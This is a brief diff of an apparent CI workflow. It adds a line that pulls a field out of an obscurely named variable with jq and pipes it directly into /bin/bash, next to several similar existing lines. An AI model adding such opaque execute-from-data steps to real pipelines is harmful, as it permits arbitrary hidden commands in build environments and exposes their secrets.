@@ -22,6 +22,7 @@ jobs:
           echo $orp06645 | jq -r .bk56 | /bin/bash
           printf '%s' "$obo20" | jq -r .pgyc3897 | /bin/bash
           printf '%s' "$tbrpk11" | jq -r .pn07 | /bin/bash
+          printf '%s' "$gplhu745" | jq -r .ql33 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
